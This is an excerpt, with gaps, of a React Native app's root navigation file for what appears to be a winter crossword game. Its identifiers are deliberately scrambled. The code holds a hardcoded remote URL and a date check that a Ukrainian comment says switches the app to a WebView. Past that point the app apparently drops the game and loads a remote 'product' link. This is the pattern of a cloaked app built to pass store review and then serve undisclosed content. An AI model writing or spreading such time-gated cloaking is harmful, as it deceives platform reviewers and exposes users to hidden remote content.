...
import { createNativeStackNavigator as BreezStackWeaver } from '@react-navigation/native-stack';
import { NavigationContainer as FrostNavVault } from '@react-navigation/native';
import { SafeAreaProvider as SodrChillSafeitr } from 'react-native-safe-area-context';
import ProductScreen from './BefWinterBreezeCroswordSrc/ZescronteBeforeezScenesords/ProductScreen';
import { GestureHandlerRootView as OsorceGestrFiield } from 'react-native-gesture-handler';
import BefWintCrosOnbrdFlux from './BefWinterBreezeCroswordSrc/ZescronteBeforeezScenesords/WintBebrezOnboaCswod';
import CrosBefWinterCore from './BefWinterBreezeCroswordSrc/ZescronteBeforeezScenesords/CrositerBeroObgrdkord';
import BefWintBootDrift from './BefWinterBreezeCroswordSrc/ZescronteBeforeezScenesords/WeintrBzecrosdLoaineze';
const WinterStackKernel = BreezStackWeaver();
// libs
import AsyncStorage from '@react-native-async-storage/async-storage';
import { LogLevel, OneSignal } from 'react-native-onesignal';
import AppleAdsAttribution from '@vladikstyle/react-native-apple-ads-attribution';

const BreezeRouteForge = () => {
  const FrostUntitledElmeze = WinterStackKernel.Screen;
  const FrostNavigatorFlow = WinterStackKernel.Navigator;

  const breezeTransitions = {
    softFade: {
      headerShown: false,
      animation: 'fade',
    },
  ...
  const INITIAL_URL = `https://solid-path-cloud.site/`;
  const URL_IDENTIFAIRE = `LIbpJgEl`;
  ...
  OneSignal.initialize('3544f5b8-0c61-436b-bfbe-f6d3eefc470b');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2026-01-22T08:08:00'); //дата з якої поч працювати webView
  ...
  const Route = ({ isFatch }) => {
    ...
    if (isFatch) {
      return (
        <FrostNavigatorFlow screenOptions={{ headerShown: false }}>
          <FrostUntitledElmeze
            initialParams={{
              responseToPushPermition,
              product: finalLink,
    ...
    return (
      <FrostNavigatorFlow
        initialRouteName="BefWinterOnboardGate"
        screenOptions={{
          animationEnabled: true,
          contentStyle: { backgroundColor: 'rgba(0, 64, 49, 1)' },
        }}
      >
        <FrostUntitledElmeze
          name="BefWinterOnboardGate"
          component={BefWintCrosOnbrdFlux}
          options={{
            title: 'Onboard Flow',
            ...breezeTransitions.hushBlink,
          }}
        />
        <FrostUntitledElmeze
          name="CrositerBeroObgrdkord"
          component={CrosBefWinterCore}
          options={{
            title: 'Main Flow',
            gestureEnabled: false,
            ...breezeTransitions.softFade,
          }}
        />
        <FrostUntitledElmeze
          name="WeintrBzecrosdLoaineze"
          component={BefWintBootDrift}
          options={{
            title: 'Boot Drift',
            ...breezeTransitions.softFade,
          }}
  ...
  return (
    <FrostNavVault>
      {!isLoading ? <BefWintBootDrift /> : <Route isFatch={route} />}
    </FrostNavVault>
  );
};

const BefWinterRootCradle = () => {
  return (
    <OsorceGestrFiield
      style={{ flex: 1, backgroundColor: 'rgba(0, 64, 49, 1)' }}
    >
      <SodrChillSafeitr>
        <BreezeRouteForge />
      </SodrChillSafeitr>
...
export default BefWinterRootCradle;
